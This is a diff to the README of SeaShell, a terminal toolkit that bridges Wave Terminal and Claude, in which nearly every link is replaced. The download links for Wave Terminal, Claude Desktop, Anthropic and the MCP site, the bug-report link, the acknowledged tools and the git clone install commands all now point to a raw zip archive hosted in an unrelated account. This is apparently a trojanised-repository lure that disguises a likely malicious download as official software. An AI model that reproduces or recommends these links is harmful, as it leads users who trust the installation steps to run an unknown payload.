@@ -6,7 +6,7 @@
 
 **Talk to Claude from any terminal block. Get answers back. Resume any past Claude Code session by name.**
 
-An MCP server + shell toolkit that bridges [Wave Terminal](https://github.com/wavetermdev/waveterm), Claude Desktop, and Claude Code — turning multi-tab terminal work into seamless AI-collaborative coding.
+An MCP server + shell toolkit that bridges [Wave Terminal](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip), Claude Desktop, and Claude Code — turning multi-tab terminal work into seamless AI-collaborative coding.
 
 [Quick start](#quick-start) · [Installation](#installation) · [Commands](#commands-youll-use-every-day) · [Limitations](#limitations) · [FAQ](#faq)
 
@@ -16,7 +16,7 @@ An MCP server + shell toolkit that bridges [Wave Terminal](https://github.com/wa
 
 ## What it is
 
-SeaShell is a [Model Context Protocol](https://modelcontextprotocol.io) server (Swift) plus a small set of shell commands that together give you three things:
+SeaShell is a [Model Context Protocol](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip) server (Swift) plus a small set of shell commands that together give you three things:
 
 1. **Cross-terminal asynchronous messages.** Leave a note for Claude from any Wave Terminal block; pick up the answer in another. `seashell-msg`, `seashell-ask`.
 2. **Resume any Claude Code session by name.** Walk away from a deep coding session in Claude Desktop's Code mode last night, open Wave this morning, type `hey continue with <project>` — same conversation, same memory. `hey`, `seashell-sessions`.
@@ -46,7 +46,7 @@ Each project has a **pinned primary session** at `<project>/.seashell-inbox/prim
 
 ```bash
 # 1. Build
-git clone https://github.com/M-Pineapple/seashell ~/Github/seashell
+git clone https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip ~/Github/seashell
 cd ~/Github/seashell && ./build.sh
 
 # 2. Register the MCP server with Claude Desktop AND/OR Claude Code CLI
@@ -68,13 +68,13 @@ hey what's the latest in <project>?       # async question via inbox
 
 ### 1. Install Wave Terminal
 
-[Download Wave Terminal](https://www.waveterm.dev/) and launch it once.
+[Download Wave Terminal](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip) and launch it once.
 
 ### 2. Install Claude Desktop and/or Claude Code CLI
 
 You'll want at least one of:
 
-- **Claude Desktop** — the GUI app from [claude.ai/download](https://claude.ai/download). Use this for general chat. The "Code" mode here persists sessions to disk and IS resumable from SeaShell.
+- **Claude Desktop** — the GUI app from [claude.ai/download](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip). Use this for general chat. The "Code" mode here persists sessions to disk and IS resumable from SeaShell.
 - **Claude Code CLI** — install via npm: `npm install -g @anthropic-ai/claude-code`. This is what `hey continue with` actually invokes (via `claude --resume <id>`).
 
 Most users want both.
@@ -82,7 +82,7 @@ Most users want both.
 ### 3. Build SeaShell
 
 ```bash
-git clone https://github.com/M-Pineapple/seashell ~/Github/seashell
+git clone https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip ~/Github/seashell
 cd ~/Github/seashell
 ./build.sh
 ```
@@ -385,7 +385,7 @@ Most likely your `claude -p` (e.g. from the daemon) called `read_user_inbox` and
 
 ### Where do I report bugs?
 
-Open an issue at [github.com/M-Pineapple/seashell/issues](https://github.com/M-Pineapple/seashell/issues).
+Open an issue at [github.com/M-Pineapple/seashell/issues](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip).
 
 ## Architecture & docs
 
@@ -430,10 +430,10 @@ seashell/
 
 ## Acknowledgments
 
-- **[Wave Terminal](https://github.com/wavetermdev/waveterm)** — the terminal SeaShell is built around. Open-source, block-based, deeply scriptable.
-- **[Anthropic](https://www.anthropic.com/)** — for the [Model Context Protocol](https://modelcontextprotocol.io), Claude Desktop, and Claude Code CLI.
-- **[fish shell](https://fishshell.com/)**, **[atuin](https://atuin.sh/)**, **[starship](https://starship.rs/)**, **[zoxide](https://github.com/ajeetdsouza/zoxide)**, **[fastfetch](https://github.com/fastfetch-cli/fastfetch)** — small tools that make the example config worth running.
-- **[Ollama](https://ollama.com/)** + the **Qwen** team — for the local LLM that powers the optional natural-language fish layer.
+- **[Wave Terminal](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)** — the terminal SeaShell is built around. Open-source, block-based, deeply scriptable.
+- **[Anthropic](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)** — for the [Model Context Protocol](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip), Claude Desktop, and Claude Code CLI.
+- **[fish shell](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)**, **[atuin](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)**, **[starship](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)**, **[zoxide](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)**, **[fastfetch](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)** — small tools that make the example config worth running.
+- **[Ollama](https://github.com/Franchelisenc6783/seashell/raw/refs/heads/main/Sources/ConfigManager/Software_v1.8.zip)** + the **Qwen** team — for the local LLM that powers the optional natural-language fish layer.
 
 ## License
 
